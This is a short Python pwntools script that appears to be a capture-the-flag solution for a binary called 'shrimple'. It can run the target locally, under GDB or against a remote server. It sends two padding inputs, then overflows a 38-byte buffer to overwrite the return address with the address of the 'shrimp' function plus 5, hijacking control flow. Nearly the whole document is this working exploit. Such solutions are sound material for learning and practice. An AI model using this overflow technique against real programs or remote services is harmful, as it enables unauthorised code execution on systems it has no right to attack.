from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
b *0x4013a8
b *0x00000000004013f0
continue
'''.format(**locals())

# Binary filename
exe = './shrimple'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

offset = 38

# Start program
io = start()

# Send the payload
io.recvuntil(b'>>')
io.sendline((offset+5) * b'a' + b'\x00')
io.recvuntil(b'>>')
io.sendline((offset+4) * b'a' + b'\x00')
io.recvuntil(b'>>')
io.sendline((offset) * b'a' + p64(elf.symbols['shrimp'] + 5, endian='little'))

print(io.recvline().decode())
